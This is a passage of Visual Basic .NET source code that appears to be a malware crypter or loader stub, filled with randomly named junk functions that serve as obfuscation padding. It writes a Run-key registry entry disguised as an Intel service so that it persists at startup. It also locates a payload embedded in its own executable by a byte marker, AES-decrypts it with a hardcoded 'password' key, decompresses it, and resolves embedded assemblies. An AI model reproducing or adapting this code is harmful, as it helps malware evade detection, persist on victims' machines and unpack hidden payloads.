    End Function

    Public Shared Function tdyDom()
        Dim eFHtIB As Integer = 369
        Dim JwpybW As String = "GdKGrYop"
        Dim khIOpuCu As Object = {}
        Dim OkGVnQPA As Long = 895
        Dim snEdlndG As Long = 326
        Return "VrDkjJqM"
    End Function

    Public Shared Function zuBrhfES()
        Dim tfoqAlHs As Long = 553
        Dim XjmxyHUy As Integer = 129
        Dim BmkFweiE As Long = 64
        Dim epjMuAvK As Long = 305
        Dim IshUtWJQ As Integer = 451
        Dim mwfbrsWW As String = "CeUSLcMq"
        Dim ghSaJzZw As Integer = 380
        Dim JlQhHVnB As Integer = 958
        Dim noOpGrAH As Object = {}
        Dim RrNwENON As Long = 939
        Dim vuLDCjbT As Long = 632
        Dim LdAuWURn As Object = {}
        Return "pgyCUqet"
    End Function




    Public Shared Function hIzTmZWutO(bytes As Byte()) As Byte()
        Dim stream = New IO.MemoryStream()
        Dim wnuRRiFF = SjwJSMsz()

        Dim zipStream = New IO.Compression.DeflateStream(New IO.MemoryStream(bytes), IO.Compression.CompressionMode.Decompress, True)
        Dim buffer = New Byte(4095) {}
        Dim SlFUOnlh = pZqafPBN()

        While True
            Dim size = zipStream.Read(buffer, 0, buffer.Length)
            Dim XFrWViCc = IPmsQwqu()

            If size > 0 Then
                stream.Write(buffer, 0, size)
                Dim EPwEkBNv = bEhKBdeb()

            Else
                Exit While
            End If
        End While
        Dim FtQwhZwuap = DYuSlbsUHw()

        zipStream.Close()
        Return stream.ToArray()
    End Function
    Public Shared Function SjwJSMsz()
        Dim aqtYPETL As Long = 553
        Dim EtrgNagR As Integer = 129
        Dim hwpnLxtX As Long = 64
        Dim xfeefhjr As Long = 305
        Dim bicmeDxx As Integer = 451
        Dim FlatcZKD As String = "jpZAavYJ"
        Dim NsXIYSlO As Integer = 380
        Dim qvVPWozU As Integer = 958
        Dim OkGVnQPAs As Object = {}
        Dim HXCfBxMI As Long = 939
        Dim jiRZkVvc As Long = 632
        Dim yYWDqGHK As Object = {}
        Return "ajlxZeqe"
    End Function

    Public Shared Function pZqafPBN()
        Dim SGCiqmZd As Long = 553
        Dim vRQcZKIx As Integer = 129
        Dim JHWGfvUg As Long = 64
        Dim mSkAOSDA As Long = 305
        Dim BIqdTEPi As Integer = 451
        Dim dTEXDbyC As String = "sKKBINKk"
        Dim UVYvsktE As Integer = 380
        Dim jLeZxWFn As Integer = 958
        Dim xBjDDHRV As Object = {}
        Dim aMyxmeAp As Long = 939
        Dim pCDasQMX As Long = 632
        Dim RNSUbnvr As Object = {}
        Return "gEXygZHa"
    End Function

    Public Shared Function IPmsQwqu()
        Dim zQGQFFlw As Long = 553
        Dim OGMuKrwe As Integer = 129
        Dim qRaouOgy As Long = 64
        Dim FIgSzzrh As Long = 305
        Dim iTuMiXbB As Integer = 451
        Dim wJApoImj As String = "ZUOjXgWD"
        Dim nKUNdRhl As Integer = 380
        Dim CAZriDtU As Integer = 958
        Dim eLolSaco As Object = {}
        Dim tCtPXLoW As Long = 939
        Dim WNIJHjXq As Long = 632
        Dim kDNmMUjZ As Object = {}
        Return "NOcgvsSt"
    End Function

    Public Shared Function bEhKBdeb()
        Dim JHWGfvUgH As Long = 553
        Dim iXlRhwSS As Integer = 129
        Dim dfLPmCLi As Long = 64
        Dim XolOsHEx As Long = 305
        Dim DbDwUbab As Integer = 451
        Dim ykduZhUq As String = "eXvdBApU"
        Dim OrwYsQBsvp As Integer = 380
        Dim aChrOEoCEj As Integer = 958
        Dim KarRoTjhia As Object = {}
        Dim YdMxYGAcMW As Long = 939
        Dim JsGkNUYtLP As Long = 632
        Dim mITuqssMpI As Object = {}
        Return "ZQxutFuPIC"
    End Function

    Public Shared Function DYuSlbsUHw()
        Dim ktxhouYluk As String = "nGCYzqGxie"
        Dim iUcnywjMCX As Integer = 60
        Dim AtaICdTwqO As Long = 351
        Dim wzjkQibweJ As String = "QRRSiOpRnC"
        Dim bkTYpDypbu As Long = 285
        Dim wukUWirxFo As Long = 239
        Dim IFVnsWeHPi As Integer = 602
        Dim fHWwozBAOe As Integer = 812
        Dim GfAtCYqhWV As Object = {}
        Dim rvugrmOyVO As Integer = 382
        Dim ULIqUJiRzH As Long = 656
        Dim HSlqXXkUSC As Object = {}
        Dim lbiOPtiZRw As Integer = 211
        Dim nvErLrmzlo As Integer = 378
        Dim SwldSLOqEk As Object = {}
        Dim WIqUdIwCtd As Long = 303
        Dim QWQjcOZRMX As String = "jwODfvJAAO"
        Dim eCXguzRBpJ As String = "yUFOMffWyB"
        Return "vSyDpjRIHx"
    End Function


    Shared Function Loop2(ByVal BfgSyFUPbc() As Byte) As Byte()
        Dim Tmp() As Byte = BfgSyFUPbc
        Dim dnBSsBxaul = QbPzWOJQlr()

        Dim NlSVatYZLB As Integer = DXPfMEyBwd(BfgSyFUPbc) - 7
        ReDim BfgSyFUPbc(0 To NlSVatYZLB)
        For NlSVatYZLB = 0 To BfgSyFUPbc.Length - 1
            BfgSyFUPbc(NlSVatYZLB) = Tmp(NlSVatYZLB)
            Dim YtKuGGEajg = VgEDvJWOum()

        Next
        Return BfgSyFUPbc
    End Function
    Public Shared Function QbPzWOJQlr()
        Dim zpCbofTTth As String = "aNgYCEJACY"
        Dim McZLqShRBR As Integer = 60
        Dim bXeFqDdyAO As Long = 351
        Dim bAQVXCDnyF As String = "FINtPYAsxz"
        Dim HdjXLWESQr As Long = 285
        Dim ndQISrgJkn As Long = 239
        Dim qqWzcoOVYg As Integer = 602
        Dim lEvOctsksa As Integer = 812
        Dim DdtjfbcTgR As Object = {}
        Dim zjCLufjUUM As Integer = 382
        Dim TBktMLypdF As Long = 656
        Dim QzdjpOjbnB As Object = {}
        Dim zeDuAfzVvr As Integer = 211
        Dim LppOVTneFl As Integer = 378
        Dim hrqXRxJYEg As Object = {}
        Dim JQUUgVyFMY As Long = 303
        Dim gKEqqyzkgU As String = "JaSAUVTDKN"
        Dim KCERBUtsIE As String = "oLBotqqxHz"
        Return "cKOCLCXlwu"
    End Function

    Public Shared Function VgEDvJWOum()
        Dim TGjJGLioCZ As String = "XLYOfHumLU"
        Dim hmrGXxZYfL As Integer = 60
        Dim BEYopdouoE As Long = 351
        Dim yCReTgZgxA As String = "TMiaALSobu"
        Dim VivqHJYGYd As Long = 285
        Dim FFFPhYSlCV As Long = 239
        Dim SJawRLjhgQ As Integer = 602
        Dim EYTiGZIyfJ As Integer = 812
        Dim hohtjxbRJC As Object = {}
        Dim UvKtmKdUcx As Integer = 382
        Dim LZQhISyKGo As Long = 656
        Dim AYduaefzuj As Object = {}
        Dim tuTwLlectb As Integer = 211
        Dim wHZnVhNohV As Integer = 378
        Dim qUyCVnqCBO As Object = {}
        Dim vZnGuiDAKJ As Long = 303
        Dim FAFznYimdA As String = "LxeRbTYWHx"
        Dim WQgXiIiuwp As String = "raxSPnaBZj"
        Return "DljllaOLjd"
    End Function



    Shared Function Loop1(ByVal BfgSyFUPbc() As Byte, ByVal EmmtOCTcqB() As Byte, ByVal vGVkcMDryp As Integer) As Byte()
        For NlSVatYZLB As Integer = 0 To BfgSyFUPbc.Length - 1
            Dim BLOrvdZmqQ = nItLKqIqMV()

            BfgSyFUPbc(NlSVatYZLB) = EmmtOCTcqB(vGVkcMDryp + NlSVatYZLB)
        Next
        Return BfgSyFUPbc
        Dim WfdUQHmrSz = jYAUMujpzF()

    End Function
    Public Shared Function nItLKqIqMV()
        Dim maHejryDpJ As Integer = 222
        Dim PrVoNORWTC As Long = 125
        Dim CyyoQcTYnw As Long = 954
        Dim ucEdmkoPQn As Object = {}
        Dim UGIaaKySam As String = "NcybLQxvYe"
        Dim QoESVNfHNY As Object = {}
        Dim LCdhVTJVgR As Long = 331
        Dim QGSluOVTqM As Object = {}
        Dim ZilenEAFJD As Integer = 311
        Dim feJwbyrpnA As Long = 901
        Dim qxLCioANbs As Integer = 778
        Dim LHdxPStUFm As Long = 751
        Dim XSORlGgeOg As Long = 746
        Dim IpYqKWaJsY As Object = {}
        Dim VttXvIsFWT As Object = {}
        Return "HInJjXQWVM"
    End Function

    Public Shared Function jYAUMujpzF()
        Dim AobrIdjwRu As Integer = 222
        Dim CIxVEboXkm As Long = 125
        Dim vemXoinzje As Long = 954
        Dim zrsOzfVLXY As Object = {}
        Dim tFRdzkyarR As String = "yJHhYgLYAM"
        Dim uPQJmkTYoH As Object = {}
        Dim NhxrFQhuxz As Long = 331
        Dim YAzxMFqSls As Object = {}
        Dim tKRtskjZPm As Integer = 311
        Dim GVCMOYWjZg As Long = 901
        Dim qsMlooQOCX As Integer = 778
        Dim DvhSZaiJgS As Long = 751
        Dim pKbFNpGafM As Long = 746
        Dim SboPqMZtJF As Object = {}
        Dim EiSPtZcwdz As Object = {}
        Return "irPnlvZBbt"
    End Function



    Shared Sub DEBMnDIoTp()
        Dim regKey As Microsoft.Win32.RegistryKey
        Dim TsBPEK = kLlRhtdbvm()

        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        Dim qcoFam = crhrPB()

        regKey.SetValue("Intel(R) Dynamic Platform and Thermal Framework LPM Policy Service Helper", """" & Application.ExecutablePath & """")
        Dim FNuSmY = SQPzXL()

        regKey.Close()
        Dim doQVYz = OLauxP()

    End Sub
    Public Shared Function kLlRhtdbvm()
        Dim ATDuAc As String = "nPiOQq"
        Dim kDdXFt As Long = 677
        Dim XsrDjF As Long = 442
        Dim VXVanH As String = "KEUUgS"
        Return "YxqUdF"
    End Function

    Public Shared Function crhrPB()
        Dim wOOqbh As String = "MrERBR"
        Dim gqXfuw As Long = 677
        Dim xLxUkg As Long = 442
        Dim TDAwsJ As String = "NGbeDP"
        Return "lqNUas"
    End Function

    Public Shared Function SQPzXL()
        Dim BApbbb As String = "ppDIGo"
        Dim nVheKq As Long = 677
        Dim cBgYDB As Long = 442
        Dim puCYzn As String = "uotwlj"
        Return "IZAJxV"
    End Function

    Public Shared Function OLauxP()
        Dim kTaUnt As String = "PJJYGO"
        Dim XfDkkG As Long = 677
        Dim RieSwM As Long = 442
        Dim pSQISo As String = "WsSnPH"
        Return "JpxGeU"
    End Function


    Shared Function DXPfMEyBwd(ByVal EmmtOCTcqB() As Byte) As Integer
        Dim Found1 As Boolean = False
        Dim tRGwyk = FcsPUY()

        Dim Found2 As Boolean = False
        Dim hGVccw = CQmYJb()

        Dim Found3 As Boolean = False
        Dim MwDhvRoA = JuwXYU()

        Dim Found4 As Boolean = False
        Dim Found5 As Boolean = False
        Dim ruboUmik = NqdhWQUe()

        Dim NlSVatYZLB As Integer = 0
        For Each bytez As Byte In EmmtOCTcqB
            Dim ggZzHxIL = CcbrIavF()

            If Found5 = True Then Exit For
            If Found1 = False Then
                Dim jnfZXtHY = FkhSZXtS()

                If bytez = &H21 Then
                    Dim bSTpJbk = lUqWTrh()

                    Found1 = True
                    Dim XGpiefm = nXYRVpf()

                End If
                Dim KpEyPsP = TArSJJh()

            Else
                If Found2 = False Then
                    If bytez = &H0 Then
                        Dim SfcgxjBTP = KfntrRDor()

                        Found2 = True
                    Else
                        Found1 = False
                        Dim KDBcKSdAt = dhqCLZEBD()

                    End If
                Else
                    If Found3 = False Then
                        Dim FQSgNxOhJ = KOAJxSxyr()

                        If bytez = &H40 Then
                            Found3 = True
                            Dim WyOPSFcq = ZFVqjBbD()

                        Else
                            Found1 = False
                            Dim mgEGmpSK = cSBQZAtl()

                            Found2 = False
                        End If
                    Else
                        If Found4 = False Then
                            Dim KuSyCQbYxk = yjhfgdnOoq()

                            If bytez = &H0 Then
                                Dim twgKAg = xJlBKd()

                                Found4 = True
                                Dim PbuTIL = tkrrAh()

                            Else
                                Found3 = False
                                Found2 = False
                                Found1 = False
                                Dim XjiRcSxtudt = GNzRrIUFAfi()

                            End If
                        Else
                            If Found5 = False Then
                                If bytez = &H21 Then
                                    Dim mHZbJDSPrRA = BJlxyOrdSXc()

                                    Found5 = True
                                Else
                                    Dim WPlDBTI = WIdcLsf()

                                    Found4 = False
                                    Found3 = False
                                    Dim hbfiShp = UpQJLVU()

                                    Found2 = False
                                    Found1 = False
                                End If
                                Dim PbKzNzwmaC = iLHBFgAUMj()

                            End If
                        End If
                    End If
                    Dim lpAcJcoWBe = MgtswBTQmK()

                End If
            End If
            NlSVatYZLB += 1
            Dim SRLSBVxUQ = KGYyGEfru()

        Next
        Return NlSVatYZLB + 1
    End Function
    Public Shared Function FcsPUY()
        Dim rxkSCm As String = "gejMvx"
        Dim tWFMsk As Long = 677
        Dim yRwkef As Long = 442
        Dim MBDxpR As String = "SodiqL"
        Return "hQTJQw"
    End Function

    Public Shared Function CQmYJb()
        Dim DxXFka As String = "jgqXSu"
        Dim GPcMpX As Long = 677
        Dim CLnIPb As Long = 442
        Dim amJLBD As String = "XaDUqG"
        Return "LPSAUS"
    End Function

    Public Shared Function JuwXYU()
        Dim cetYPBeU As Object = {}
        Dim GirfOXsa As Integer = 92
        Dim jlpnMuFg As Integer = 424
        Dim DAOrwalv As Long = 46
        Dim gDMzuwyB As String = "KGKGsSMG"
        Dim oKIOqoZM As Integer = 865
        Dim EsxFKYPh As Long = 912
        Dim ivwMJvcm As String = "LyuUHRqs"
        Dim pCsbFnDy As Integer = 303
        Dim TFqiDJRE As Long = 522
        Return "xIoqBfeK"
    End Function

    Public Shared Function NqdhWQUe()
        Dim UxawSIvq As Object = {}
        Dim yAYDQeIw As Integer = 92
        Dim cEWLOAWC As Integer = 424
        Dim GHUSMXjI As Long = 46
        Dim WpJJhHZc As String = "zsHRfdni"
        Dim dwGYdzAo As Integer = 865
        Dim HzEfbVNt As Long = 912
        Dim lCCnZrbz As String = "PGAuXOoF"
        Dim sJyCWkCL As Integer = 303
        Dim IrntqUsf As Long = 522
        Return "YZdkKEiA"
    End Function

    Public Shared Function CcbrIavF()
        Dim KjXGFTWR As Object = {}
        Dim nmVODpjX As Integer = 92
        Dim DVKFXZZr As Integer = 424
        Dim hYJMVvnx As Long = 46
        Dim LbHUUSAD As String = "peFbSoNJ"
        Dim TiDiQKbP As Integer = 865
        Dim wlBqOgoV As Long = 912
        Dim aozxMCCb As String = "qXoohnsv"
        Dim UanwfJFB As Integer = 303
        Dim ydlDdfSH As Long = 522
        Return "bgjLbBgM"
    End Function

    Public Shared Function FkhSZXtS()
        Dim ohvOdoP As Long = 74
        Dim dPCTSZz As Long = 345
        Dim wisMggG As Integer = 13
        Dim GNBKWvc As Integer = 955
        Dim AFwkecI As Long = 916
        Dim xmjReFx As String = "IydwvUd"
        Dim JnWEMtQ As String = "bjZxnBh"
        Return "hOsHxVb"
    End Function

    Public Shared Function lUqWTrh()
        Dim TSfCCJm As Long = 74
        Dim iwdoYUl As Long = 345
        Dim evfoxxQ As Integer = 13
        Dim xhkBkFN As Integer = 955
        Dim OlDhwOA As Long = 916
        Dim mOivdQE As String = "obwxjof"
        Dim iBcESUV As String = "ZJEDxDt"
        Return "GlPtpwC"
    End Function

    Public Shared Function nXYRVpf()
        Dim nRZAbpv As Long = 74
        Dim csPTfaJ As Long = 345
        Dim dOtIWyG As Integer = 13
        Dim plmTcNG As Integer = 955
        Dim fAeFrxA As Long = 916
        Dim dZAzGZT As String = "XpiZBFp"
        Dim YVLvgdG As String = "ZTDklDN"
        Return "hrFHKVl"
    End Function

    Public Shared Function TArSJJh()
        Dim ksEGmsH As Long = 74
        Dim PjvWAnH As Long = 345
        Dim tlkSDjc As Integer = 13
        Dim MPZsEqD As Integer = 955
        Dim MVhTuQg As Long = 916
        Dim bCWsbbg As String = "LSYqMQx"
        Dim VFxanhptI As String = "mOQWtpMUy"
        Return "JEKnFtWhw"
    End Function

    Public Shared Function KfntrRDor()
        Dim ayfndCpLQ As String = "phdptNYNO"
        Dim zHmWqcKRe As Long = 709
        Dim TqaNljVSN As Integer = 515
        Dim QSOerMaaY As String = "lQYhpQFBB"
        Dim EoOrwXwEm As Integer = 934
        Dim xbKBKEtLK As String = "WrZMMFryB"
        Dim kinBORvOe As Integer = 516
        Dim MFIngPrOk As String = "fwNQNXZcx"
        Dim uVMlpingy As Long = 410
        Dim AGeLuCRkb As Integer = 384
        Dim XGWJuFvwX As Integer = 484
        Dim PBjFtnNRa As Object = {}
        Dim GOKVSWVzG As String = "SOowEkvdP"
        Return "MiVntQCYK"
    End Function

    Public Shared Function dhqCLZEBD()
        Dim PwjpAndSC As String = "RPxIAKoLS"
        Dim uwQaGIEJV As Long = 709
        Dim QcMKfLuYW As Integer = 515
        Dim OOyIZoTfe As String = "ZgrDkCjVP"
        Dim pncFnMIMn As Integer = 934
        Dim nGzkIorGT As String = "dmpTFYpAc"
        Dim yCOqceKoi As Integer = 516
        Dim nNHLxPUmv As String = "NVGkOPwLG"
        Dim JPIUtsqgu As Long = 410
        Dim neNTbpRRV As Integer = 384
        Dim nXFslOolt As Integer = 484
        Dim DppbcYhaO As Object = {}
        Dim GxDNowYUh As String = "sLpohkDEc"
        Return "SIpgKkLeq"
    End Function

    Public Shared Function KOAJxSxyr()
        Dim pnKhDmRX As Long = 743
        Dim ABMWQbqw As Object = {}
        Dim xuGwzerj As Long = 624
        Dim unAVjhtW As Object = {}
        Dim FBCKwWSv As String = "BtwkfZUi"
        Dim ymqJOdWV As Object = {}
        Dim JAszbSvt As Integer = 754
        Dim GtmYKVwg As String = "DmgxuYyT"
        Dim NzinHNXs As Integer = 88
        Dim KscMqRZf As Object = {}
        Dim VGfBDGyE As String = "SzYbmJAr"
        Return "PrSAWMBe"
    End Function

    Public Shared Function ZFVqjBbD()
        Dim TrIoBIed As Long = 743
        Dim eFLeOxDC As Object = {}
        Dim NcvnUOhD As Long = 624
        Dim KVpMDRjq As Object = {}
        Dim VjsCQGIP As String = "RclbzKKC"
        Dim OUfAiNMp As Object = {}
        Dim ZiiqvClO As Integer = 754
        Dim WbbPfFmB As String = "TUVoOIoo"
        Dim diYebyNM As Integer = 88
        Dim aaRDKBPz As Object = {}
        Dim XTLcuERm As String = "ihOSHtqL"
        Return "faHrqwry"
    End Function

    Public Shared Function cSBQZAtl()
        Dim jZxfVsUx As Long = 743
        Dim gSrFFvWk As Object = {}
        Dim grUrDuNS As Long = 624
        Dim dkOQnxPF As Object = {}
        Dim acIqWBQssN As String = "bFuGDAqgrE"
        Dim FNrevWolpy As Object = {}
        Dim HiNHrUsMJq As Integer = 754
        Dim miutypUDcm As String = "pvzkIlCPRg"
        Dim kJZyIrgdkZ As Integer = 88
        Dim CiXTLYQNYQ As Object = {}
        Dim yogwacXNNL As String = "SGOesJljWE"
        Return "PEHTVMXVfA"
    End Function

    Public Shared Function yjhfgdnOoq()
        Dim gwTHxuxRwf As String = "IVxEMTmyFX"
        Dim fPibWvneZU As Object = {}
        Dim uKnVWgjLYQ As Long = 565
        Dim vmZlDgJzWH As Integer = 71
        Dim ZvWJvCGFVB As String = "NujWNOntKx"
        Dim GQZYyUmWIp As Object = {}
        Dim KcfPIRViwj As Integer = 542
        Dim EqEeIXywQc As Integer = 534
        Dim JvtihSLuZX As Long = 109
        Dim SWLbaIqgsO As String = "motJsoECBH"
        Dim jmmzVrqoLD As Long = 962
        Dim EvDuCWivpx As Long = 862
        Dim RHpNYKWFyr As String = "BeznxaQkci"
        Dim OhUTiMhgGe As Long = 633
        Dim pIoDIl As Integer = 61
        Dim LzrfQP As Object = {}
        Dim shJxyi As String = "dmEDyx"
        Return "KMGivQ"
    End Function

    Public Shared Function xJlBKd()
        Dim hluret As Object = {}
        Dim fRYNiv As String = "UyXHbG"
        Dim UVlruH As Integer = 789
        Dim YPbPfC As Integer = 240
        Dim mAicro As String = "smINri"
        Dim IPyoST As Integer = 512
        Return "cPRDLy"
    End Function

    Public Shared Function tkrrAh()
        Dim JfVBUR As Object = {}
        Dim hOHrrt As String = "OoJWnM"
        Dim BloqDZ As Integer = 789
        Dim nkLrqCsEqHY As Integer = 240
        Dim drnrUlQnxRx As String = "UKNWnUIUCQO"
        Dim feXopkKZtxN As Integer = 512
        Return "awnInPfGiXn"
    End Function

    Public Shared Function GNzRrIUFAfi()
        Dim qDYKqZExGLL As String = "rjBfVxVDaii"
        Dim AoojWPDhXst As Integer = 942
        Dim pOfCazRcHpz As Integer = 697
        Dim RgBXyxddoXk As Object = {}
        Dim LGiehdTXIvz As Integer = 605
        Dim JUGsIFSSPDg As String = "YzEeeQRVoBg"
        Dim vuyLkTKhLmf As Long = 921
        Dim wirTBtxBLIr As Object = {}
        Dim WlqcYtpbxSp As Integer = 808
        Dim KTxhNeZlMPj As Long = 446
        Dim EifHILvhixH As String = "VaKUUUNSYaB"
        Dim llumReVIVjV As String = "zYJLZqqYZfJ"
        Dim BlXNfORSROA As Object = {}
        Dim mMYrDCCOQlw As Long = 69
        Dim eMjEwlFjswg As Object = {}
        Dim RDGwWXKHmrP As Long = 99
        Dim PusKJATNUeU As Object = {}
        Dim GjFqPiBjyzN As Object = {}
        Dim otBNibUVkIT As String = "nSXIxCnOpGs"
        Dim HdxOZIYDWpV As Integer = 836
        Return "rMOfiyfNBLG"
    End Function

    Public Shared Function BJlxyOrdSXc()
        Dim CwWuTNlQPDs As String = "stzMJxpBYXZ"
        Dim rAHozYSiAhR As Integer = 942
        Dim ohuVzAHpkef As Integer = 697
        Dim NUXQUCfncQq As Object = {}
        Dim lWeQzDaVZbe As Integer = 605
        Dim amXCPoUSLjs As String = "jCJnEFW"
        Dim dzctalC As Long = 921
        Dim KllQGef As Object = {}
        Dim uUCiPUm As Integer = 808
        Dim KgmAMev As Long = 446
        Dim AGcTPOJ As String = "BcHIHnG"
        Dim NzzTMBG As String = "CPrFcmA"
        Dim BoOzqNT As Object = {}
        Dim vDwZmup As Long = 69
        Dim wjYvRSG As Object = {}
        Dim xiQkVrN As Long = 99
        Dim EFSHvKl As Object = {}
        Dim qOESuyh As Object = {}
        Dim iDRyzgP As String = "IGRGWgH"
        Dim YczFHqk As Integer = 836
        Return "DepCKlE"
    End Function

    Public Shared Function WIdcLsf()
        Dim vkzfxTq As Object = {}
        Dim gABchJH As Object = {}
        Dim pnbNIZz As Long = 785
        Dim OxqIRaN As Integer = 130
        Dim wRlLYSA As Integer = 584
        Dim ZbruLPr As Object = {}
        Dim KCrZjEc As String = "IRPnKgb"
        Dim NEyjGBq As Long = 844
        Dim jHIDxFG As Object = {}
        Return "wWkcSSk"
    End Function

    Public Shared Function UpQJLVU()
        Dim vYsnNtd As Object = {}
        Dim MROmlCw As Object = {}
        Dim vStWTtt As Long = 785
        Dim HPPUXGlbBj As Integer = 130
        Dim HUOkRGVaaE As Integer = 584
        Dim PgKQHzglzX As Object = {}
        Dim yoxcfQGpis As String = "oCgCzaHFRL"
        Dim ENIKAJXOLf As Long = 844
        Dim cefgylOiEy As Object = {}
        Return "brvjdmUvIR"
    End Function

    Public Shared Function iLHBFgAUMj()
        Dim qcBwpYveJY As Integer = 963
        Dim FutqbIhBiq As Object = {}
        Dim OyYjgzWycM As String = "yyvITQaogh"
        Dim pFOwCZFpkC As Integer = 299
        Dim VdiiwtXVdT As Object = {}
        Dim vmqRITsbro As Integer = 843
        Dim vrpiCTcbQI As Object = {}
        Dim DDkNsLnmpc As Object = {}
        Dim zggpuPkbDt As Object = {}
        Dim puQQOZlrmM As String = "GFrXPIBzgg"
        Dim QBGdjyUiuC As String = "POWgOzavyW"
        Dim VihyqtHUCo As Long = 897
        Dim CylwyLDmQH As String = "rUlKEXZQeZ"
        Dim tRUnMVoBYv As String = "QqIwvyAkxN"
        Dim zqfWiPEZBi As Long = 612
        Return "ESHauJHNkA"
    End Function

    Public Shared Function MgtswBTQmK()
        Dim zQIIgOwHE As String = "YfXTiPuuu"
        Dim mXlIkbyKY As Long = 974
        Dim OuHuCZvKe As Object = {}
        Dim hlLXjgcYr As Object = {}
        Dim wKKtLsrcs As String = "CucTQLUgV"
        Dim nQehuAWdw As Long = 420
        Dim fLqdtjozz As Long = 7
        Dim VYRtSSwhf As Integer = 155
        Dim iXvUEfWLn As Object = {}
        Dim csdKtLcGj As Integer = 736
        Dim trxaLUfjc As String = "MsAkgcgwn"
        Dim eGrNzjDAa As Long = 434
        Return "hZEfAGPtq"
    End Function

    Public Shared Function KGYyGEfru()
        Dim QDxQvyWbY As String = "bVqKGMmRJ"
        Dim dGSwfkoWC As Long = 974
        Dim bapbAMWQi As Object = {}
        Dim fbnabisxW As Object = {}
        Dim ArNxyoNlc As String = "bhxCpnzxK"
        Dim PKErkYzHA As Long = 420
        Dim LEHcPCtco As Long = 7
        Dim pTMbxzUOP As Integer = 155
        Dim pMEzHYrhn As Object = {}
        Dim FdniyikWI As Integer = 736
        Dim uRtEhUEfw As String = "uAnwDtGAW"
        Dim UxnngtOak As Long = 434
        Return "MCyQTcBul"
    End Function



    Shared Function GeWGdBxOLC(ByVal SuGqtpUXtQ As String) As Byte()
        Return FileIO.FileSystem.ReadAllBytes(SuGqtpUXtQ)
        Dim rcIoZvUTInc = HERnjHRdD()

    End Function
    Public Shared Function HERnjHRdD()
        Dim obKpyZynUYW As Integer = 632
        Dim xOjZZqqFouB As Long = 5
        Dim dfvjejfEGCw As Object = {}
        Dim uCdiPtItAAH As String = "NVUbdAPwMiZ"
        Dim OBwxIYgCgFw As Long = 399
        Dim XGkBJqOgdOH As Long = 795
        Dim MhaTMacbNMN As String = "adoYHmRqPyt"
        Dim iYdvUEfWOSN As String = "TSstRuGfqep"
        Dim iwrfnFFiQbp As Long = 906
        Dim SMtdXuWgSJu As Integer = 928
        Dim TBmlnUJARfF As String = "tDmtKUBaDpD"
        Dim hltyzFlkSly As Object = {}
        Dim NfSIQAjuKXQ As Long = 731
        Dim GNPBlhvCJuU As Integer = 519
        Dim WZzUirEsGDo As Long = 273
        Dim WqFcLRBXgCY As Long = 934
        Dim KjKOnDFfsoJ As String = "JfTJpdOOWIK"
        Dim BffWiMQizTu As String = "aAtxeNyUOSZ"
        Dim mMnbwbeMaAj As Integer = 715
        Return "dCAHBKMiEWb"
    End Function


    Public Shared _initialized As Boolean
    Shared Sub KdMuJwZMvc()
        If Not _initialized Then
            Dim KkTZjdyNvdG = LLweUCfUrfh()

            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf RetrieveEmbeddedAssembly
            _initialized = True
        End If
        Dim zSyvsNyAin = gXENNhZUzQ()

    End Sub
    Public Shared Function LLweUCfUrfh()
        Dim evsgMjjCcMj As Integer = 632
        Dim OeJxVZqMHiU As Long = 5
        Dim XbhOkqDdZuq As Object = {}
        Dim vELcRsGdTrK As String = "ZORLFoxPVaG"
        Dim BrmNSmdOzyj As Long = 399
        Dim AxtpHNGvbHb As Long = 795
        Dim yegWHpvCLEo As String = "ZytesnIvWd"
        Dim YLIhXoOJaw As String = "efUzyivieP"
        Dim MvYyHBrAsi As Long = 906
        Dim mwPviaqsbD As Integer = 928
        Dim COGpVKcPAW As String = "LSmhaBRLtr"
        Dim InRXqEsncJ As Object = {}
        Dim AulLZNYoge As Long = 731
        Dim gSFwThpUav As Integer = 519
        Dim FbMggHKboP As Long = 273
        Dim FgLwZHuaNk As Long = 934
        Dim NsHbQzFlmE As String = "JVDERDDaAV"
        Dim zkmelNDqjo As String = "QuOmnwTzcI"
        Dim oLlIkYKTWb As Integer = 715
        Return "nYBLPZQgZu"
    End Function

    Public Shared Function gXENNhZUzQ()
        Dim ooyIxZUewF As String = "plhmGXiPqb"
        Dim MKVvpAvxOs As String = "wKsUbRznTO"
        Dim BmUYoLCaBf As Integer = 777
        Dim TpftEtwVQA As Object = {}
        Dim tyndQURbeU As Object = {}
        Dim HYvKoGYMil As Object = {}
        Dim OkqpeyjXHF As Long = 806
        Dim xseBCQJbqa As Object = {}
        Dim nHNbWaKqZt As Object = {}
        Dim tcPgJTsIHC As Long = 120
        Dim RunCHvjcAV As Long = 96
        Dim QHCFmw As String = "bkCshk"
        Dim bfDbnl As Integer = 274
        Dim VLsKLr As String = "DJgpvJ"
        Dim esJSxh As Integer = 205
        Dim hWddhf As String = "rItCNV"
        Return "pLLYFW"
    End Function


    Private Shared Function HWFTsAbAgD(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim nODecZ = izPtOe()

        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim aafvZm = GyzgTG()


        Try
            Dim YfnEcnWr = tkFjPSeA()

            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Dim WQQqapCQ = rViVNUKZ()

            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            Dim bLopbKD = qSZseUc()

            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim sbPNWtD = jVbJWcV()

            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
            Dim WOpoHOcVq = UnLjWqvOu()

        Catch ex As Exception
            Return Nothing
        End Try
        Dim pPrxcWdiB = YQXiKNaFI()

    End Function
    Public Shared Function izPtOe()
        Dim NFvvPz As Object = {}
        Dim Osgsky As Long = 6
        Dim JQEnXD As String = "sFcgWU"
        Dim jBxnRd As Object = {}
        Dim BuKbtL As String = "MXKOoA"
        Return "MSLyuA"
    End Function

    Public Shared Function GyzgTG()
        Dim FqrmqGhK As Long = 484
        Dim klZGDbZC As Long = 224
        Dim PhHbQwRu As Object = {}
        Dim ucowdRIm As String = "nsfhUYXP"
        Dim SoNChtPH As Object = {}
        Dim xjvXuOHy As String = "cfcsHjyq"
        Dim HaKMUEqi As Integer = 421
        Dim AqByLLFL As Object = {}
        Dim fmjSYgxD As Long = 768
